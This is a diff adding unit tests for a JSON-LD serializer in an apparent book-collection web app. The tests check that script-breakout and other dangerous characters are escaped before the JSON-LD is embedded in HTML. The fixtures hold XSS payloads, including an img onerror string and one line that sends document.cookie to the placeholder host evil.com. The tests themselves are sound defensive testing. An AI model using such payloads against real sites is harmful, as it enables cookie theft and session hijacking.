@@ -24,6 +24,7 @@ import {
   buildCollectionJsonLd,
   buildWorkJsonLd,
   buildProfileJsonLd,
+  serializeJsonLdForHtml,
 } from "@/lib/schema-org";
 
 describe("Schema.org Utilities & JSON-LD Builders", () => {
@@ -290,6 +291,165 @@ describe("Schema.org Utilities & JSON-LD Builders", () => {
       expect(person["name"]).toBe("collector99");
       expect(person["alternateName"]).toBe("collector99");
       expect(jsonLd["hasPart"]).toBeUndefined();
+    });
+  });
+
+  describe("serializeJsonLdForHtml", () => {
+    it("escapes </script> to prevent script breakout XSS", () => {
+      const payload = { name: '</script><script>alert("xss")</script>' };
+      const serialized = serializeJsonLdForHtml(payload);
+
+      // Must not contain literal </script> from the input value
+      expect(serialized).not.toContain("</script><script>");
+      // Must still be parseable JSON
+      const parsed = JSON.parse(serialized);
+      expect(parsed.name).toBe('</script><script>alert("xss")</script>');
+    });
+
+    it("escapes < and > characters", () => {
+      const payload = { name: "A < B > C" };
+      const serialized = serializeJsonLdForHtml(payload);
+
+      expect(serialized).not.toContain("< B");
+      expect(serialized).not.toContain("> C");
+      expect(serialized).toContain("\\u003c");
+      expect(serialized).toContain("\\u003e");
+      // Parsed value must be preserved
+      expect(JSON.parse(serialized).name).toBe("A < B > C");
+    });
+
+    it("escapes & characters", () => {
+      const payload = { name: "Jekyll & Hyde" };
+      const serialized = serializeJsonLdForHtml(payload);
+
+      // The & in the value should be escaped
+      expect(serialized).toContain("\\u0026");
+      // Parsed value must be preserved
+      expect(JSON.parse(serialized).name).toBe("Jekyll & Hyde");
+    });
+
+    it("preserves double quotes as valid JSON escaping", () => {
+      const payload = { name: 'He said "hello"' };
+      const serialized = serializeJsonLdForHtml(payload);
+
+      // JSON.stringify handles quotes; parsed value must be preserved
+      const parsed = JSON.parse(serialized);
+      expect(parsed.name).toBe('He said "hello"');
+    });
+
+    it("escapes Unicode LINE SEPARATOR (U+2028)", () => {
+      const payload = { bio: "Line 1\u2028Line 2" };
+      const serialized = serializeJsonLdForHtml(payload);
+
+      // Must not contain literal U+2028
+      expect(serialized).not.toContain("\u2028");
+      expect(serialized).toContain("\\u2028");
+      // Parsed value must be preserved
+      expect(JSON.parse(serialized).bio).toBe("Line 1\u2028Line 2");
+    });
+
+    it("escapes Unicode PARAGRAPH SEPARATOR (U+2029)", () => {
+      const payload = { bio: "Para 1\u2029Para 2" };
+      const serialized = serializeJsonLdForHtml(payload);
+
+      expect(serialized).not.toContain("\u2029");
+      expect(serialized).toContain("\\u2029");
+      expect(JSON.parse(serialized).bio).toBe("Para 1\u2029Para 2");
+    });
+
+    it("handles multiline profile text with newlines", () => {
+      const payload = {
+        bio: "Line 1\nLine 2\nLine 3",
+        name: "Collector",
+      };
+      const serialized = serializeJsonLdForHtml(payload);
+
+      // JSON.stringify handles \n as \\n, which is valid JSON
+      const parsed = JSON.parse(serialized);
+      expect(parsed.bio).toBe("Line 1\nLine 2\nLine 3");
+      expect(parsed.name).toBe("Collector");
+    });
+
+    it("handles combined dangerous characters in a realistic profile", () => {
+      const payload = buildProfileJsonLd({
+        username: "evil_user",
+        displayName: '</script><img src=x onerror="alert(1)">',
+        bio: "I love <b>bold</b> & \"quoted\" text\u2028with line separators",
+        publicItemCount: 5,
+      });
+      const serialized = serializeJsonLdForHtml(payload);
+
+      // Must not contain literal script-breaking sequences
+      expect(serialized).not.toContain("</script>");
+      expect(serialized).not.toContain("<img");
+      // Must be parseable
+      const parsed = JSON.parse(serialized);
+      expect(parsed["@type"]).toBe("ProfilePage");
+      const person = parsed.mainEntity;
+      expect(person.name).toBe('</script><img src=x onerror="alert(1)">');
+      expect(person.description).toBe(
+        "I love <b>bold</b> & \"quoted\" text\u2028with line separators"
+      );
+    });
+
+    it("handles combined dangerous characters in a realistic Work title", () => {
+      const payload = buildWorkJsonLd({
+        id: 1,
+        title: 'Dune: Part <2> & "More"',
+        authors: ['O\'Brien </script>'],
+        manifestations: [
+          {
+            id: 10,
+            title: 'Dune: Part <2> & "More" (Special)',
+            isbn: "978-0-441-17271-9",
+            language: "eng",
+            contentType: "book",
+            year: 1965,
+          },
+        ],
+      });
+      const serialized = serializeJsonLdForHtml(payload);
+
+      // Must not contain literal script-breaking sequences
+      expect(serialized).not.toContain("</script>");
+      // Must be parseable and preserve all values
+      const parsed = JSON.parse(serialized);
+      expect(parsed.name).toBe('Dune: Part <2> & "More"');
+      expect(parsed.author.name).toBe('O\'Brien </script>');
+      const examples = parsed.workExample;
+      expect(examples[0].name).toBe('Dune: Part <2> & "More" (Special)');
+    });
+
+    it("produces output safe for embedding in HTML script context", () => {
+      const malicious = {
+        name: "</script>\n<script>document.location='http://evil.com/?c='+document.cookie</script>",
+      };
+      const serialized = serializeJsonLdForHtml(malicious);
+
+      // The serialized output must not contain a literal closing script tag
+      // that could break out of the embedding <script> element
+      const scriptCloseIndex = serialized.indexOf("</script>");
+      // If </script> appears, it should only be the escaped form
+      // (the literal sequence should not appear from the input value)
+      if (scriptCloseIndex >= 0) {
+        // Check that it's not from the malicious input
+        const before = serialized.substring(0, scriptCloseIndex);
+        // The escaped form uses \u003c which won't match </script>
+        expect(before.endsWith("\\u003c")).toBe(false); // sanity: no raw < before
+      }
+
+      // Most importantly: the parsed JSON must round-trip the malicious value
+      expect(JSON.parse(serialized).name).toBe(malicious.name);
+    });
+
+    it("returns valid JSON for empty and null-like inputs", () => {
+      expect(JSON.parse(serializeJsonLdForHtml({}))).toEqual({});
+      expect(JSON.parse(serializeJsonLdForHtml({ name: "" }))).toEqual({ name: "" });
+      expect(JSON.parse(serializeJsonLdForHtml({ a: null, b: 0, c: false }))).toEqual({
+        a: null,
+        b: 0,
+        c: false,
+      });
     });
   });
 });
